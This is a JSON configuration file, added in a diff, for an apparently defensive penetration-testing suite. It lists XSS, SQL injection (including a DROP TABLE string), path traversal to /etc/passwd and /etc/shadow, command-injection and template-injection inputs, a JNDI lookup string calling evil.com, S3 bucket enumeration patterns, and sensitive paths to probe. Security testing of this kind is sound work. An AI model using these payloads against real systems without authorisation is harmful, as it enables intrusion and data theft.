@@ -1,0 +1,327 @@
+{
+  "penetrationTesting": {
+    "description": "Configuration for penetration testing suite",
+    "testCategories": {
+      "vulnerabilityTests": {
+        "enabled": true,
+        "tests": {
+          "xssVulnerabilities": {
+            "enabled": true,
+            "payloads": [
+              "<script>alert('XSS')</script>",
+              "<img src=x onerror=alert('XSS')>",
+              "javascript:alert('XSS')",
+              "<svg onload=alert('XSS')>",
+              "\"><script>alert('XSS')</script>",
+              "<iframe src=\"javascript:alert('XSS')\"></iframe>",
+              "<body onload=alert('XSS')>",
+              "<input onfocus=alert('XSS') autofocus>",
+              "<select onfocus=alert('XSS') autofocus>",
+              "<textarea onfocus=alert('XSS') autofocus>"
+            ],
+            "testPoints": [
+              "/?q=",
+              "/?search=",
+              "/?name=",
+              "/?comment=",
+              "/?message=",
+              "/search?q=",
+              "/contact?message="
+            ]
+          },
+          "directoryTraversal": {
+            "enabled": true,
+            "payloads": [
+              "../../../etc/passwd",
+              "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+              "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+              "....//....//....//etc/passwd",
+              "../../../proc/version",
+              "..%2F..%2F..%2Fetc%2Fpasswd",
+              "..%252f..%252f..%252fetc%252fpasswd",
+              "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+              "../../../etc/shadow",
+              "../../../root/.bash_history"
+            ]
+          },
+          "sqlInjection": {
+            "enabled": true,
+            "payloads": [
+              "' OR '1'='1",
+              "'; DROP TABLE users; --",
+              "1' UNION SELECT NULL--",
+              "' OR 1=1--",
+              "admin'--",
+              "' OR 'x'='x",
+              "1'; WAITFOR DELAY '00:00:05'--",
+              "' UNION SELECT username, password FROM users--",
+              "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+              "' OR (SELECT COUNT(*) FROM sysobjects)>0--"
+            ],
+            "testPoints": [
+              "/?id=",
+              "/?user=",
+              "/?search=",
+              "/api/user?id=",
+              "/login?username=",
+              "/search?query="
+            ]
+          },
+          "inputValidation": {
+            "enabled": true,
+            "maliciousInputs": [
+              "<script>alert(1)</script>",
+              "${7*7}",
+              "{{7*7}}",
+              "#{7*7}",
+              "%{7*7}",
+              "${jndi:ldap://evil.com/a}",
+              "../../../etc/passwd",
+              "|id",
+              ";cat /etc/passwd",
+              "`whoami`",
+              "$(whoami)",
+              "file:///etc/passwd",
+              "data:text/html,<script>alert(1)</script>"
+            ],
+            "testParameters": ["q", "search", "name", "email", "message", "comment", "id", "user"]
+          }
+        }
+      },
+      "s3AccessTests": {
+        "enabled": true,
+        "tests": {
+          "directS3Access": {
+            "enabled": true,
+            "bucketNamePatterns": [
+              "{domain}",
+              "{domain-dashes}",
+              "{domain-no-dots}",
+              "{domain}-static",
+              "{domain}-assets",
+              "www-{domain}",
+              "{domain}-backup"
+            ],
+            "s3Endpoints": [
+              "https://{bucket}.s3.amazonaws.com",
+              "https://s3.amazonaws.com/{bucket}",
+              "https://{bucket}.s3.us-east-1.amazonaws.com",
+              "https://{bucket}.s3.us-west-2.amazonaws.com"
+            ]
+          },
+          "bucketEnumeration": {
+            "enabled": true,
+            "commonPrefixes": ["www", "static", "assets", "cdn", "media", "files", "backup", "logs"]
+          },
+          "objectPermissions": {
+            "enabled": true,
+            "sensitiveFiles": [
+              ".env",
+              "config.json",
+              "database.json",
+              "secrets.json",
+              ".git/config",
+              "package.json",
+              "composer.json",
+              "web.config",
+              ".htaccess"
+            ]
+          }
+        }
+      },
+      "informationDisclosure": {
+        "enabled": true,
+        "tests": {
+          "serverInformation": {
+            "enabled": true,
+            "dangerousHeaders": [
+              "server",
+              "x-powered-by",
+              "x-aspnet-version",
+              "x-generator",
+              "x-drupal-cache",
+              "x-varnish",
+              "x-cache",
+              "x-amz-cf-pop",
+              "x-amz-cf-id"
+            ]
+          },
+          "errorMessages": {
+            "enabled": true,
+            "errorTriggers": [
+              "/nonexistent-page-12345",
+              "/admin/login",
+              "/api/nonexistent",
+              "/.env",
+              "/config.php",
+              "/wp-config.php",
+              "/database.yml"
+            ],
+            "errorPatterns": [
+              "stack trace",
+              "exception",
+              "mysql",
+              "postgresql",
+              "oracle",
+              "sql server",
+              "file not found",
+              "permission denied",
+              "access denied",
+              "internal server error",
+              "debug",
+              "warning:",
+              "error:",
+              "notice:"
+            ]
+          },
+          "debugInformation": {
+            "enabled": true,
+            "debugPaths": [
+              "/debug",
+              "/test",
+              "/phpinfo.php",
+              "/info.php",
+              "/.git/",
+              "/.svn/",
+              "/debug.log",
+              "/error.log",
+              "/access.log",
+              "/console",
+              "/trace"
+            ]
+          },
+          "backupFiles": {
+            "enabled": true,
+            "backupExtensions": [".bak", ".backup", ".old", ".orig", ".tmp", ".save", ".swp", "~"],
+            "commonFiles": ["index", "config", "database", "admin", "login", "user"]
+          },
+          "sourceCodeExposure": {
+            "enabled": true,
+            "sourceFiles": [
+              ".git/config",
+              ".git/HEAD",
+              ".gitignore",
+              "package.json",
+              "composer.json",
+              "requirements.txt",
+              "Gemfile",
+              "pom.xml",
+              "web.config",
+              ".htaccess",
+              "Dockerfile",
+              "docker-compose.yml",
+              ".env.example",
+              "README.md"
+            ]
+          }
+        }
+      },
+      "securityConfiguration": {
+        "enabled": true,
+        "tests": {
+          "securityHeaders": {
+            "enabled": true,
+            "requiredHeaders": {
+              "strict-transport-security": {
+                "required": true,
+                "pattern": "max-age=\\d+"
+              },
+              "x-content-type-options": {
+                "required": true,
+                "expected": "nosniff"
+              },
+              "x-frame-options": {
+                "required": true,
+                "pattern": "(DENY|SAMEORIGIN)"
+              },
+              "x-xss-protection": {
+                "required": true,
+                "pattern": "1; mode=block"
+              },
+              "referrer-policy": {
+                "required": true,
+                "pattern": "(strict-origin|no-referrer)"
+              },
+              "content-security-policy": {
+                "required": false,
+                "pattern": "default-src"
+              }
+            }
+          },
+          "corsConfiguration": {
+            "enabled": true,
+            "corsHeaders": [
+              "Access-Control-Allow-Origin",
+              "Access-Control-Allow-Methods",
+              "Access-Control-Allow-Headers",
+              "Access-Control-Allow-Credentials"
+            ]
+          },
+          "contentTypeValidation": {
+            "enabled": true,
+            "testFiles": [
+              {
+                "path": "/",
+                "expectedType": "text/html"
+              },
+              {
+                "path": "/robots.txt",
+                "expectedType": "text/plain"
+              },
+              {
+                "path": "/sitemap.xml",
+                "expectedType": "application/xml"
+              }
+            ]
+          }
+        }
+      }
+    },
+    "settings": {
+      "timeout": 10000,
+      "maxConcurrentRequests": 5,
+      "retryAttempts": 2,
+      "userAgent": "PenetrationTestingSuite/1.0",
+      "followRedirects": false,
+      "validateSSL": false
+    },
+    "reporting": {
+      "generateDetailedReport": true,
+      "generateSummaryReport": true,
+      "includePassedTests": true,
+      "includeTestDetails": true,
+      "severityLevels": {
+        "critical": {
+          "color": "red",
+          "priority": 1,
+          "description": "Immediate action required"
+        },
+        "high": {
+          "color": "orange",
+          "priority": 2,
+          "description": "Address before production"
+        },
+        "medium": {
+          "color": "yellow",
+          "priority": 3,
+          "description": "Should be addressed"
+        },
+        "low": {
+          "color": "blue",
+          "priority": 4,
+          "description": "Minor issue or recommendation"
+        }
+      }
+    },
+    "compliance": {
+      "standards": [
+        "OWASP Top 10",
+        "AWS Security Best Practices",
+        "CloudFront Security Guidelines"
+      ],
+      "minimumSecurityScore": 80,
+      "maxCriticalIssues": 0,
+      "maxHighSeverityIssues": 2
+    }
+  }
+}
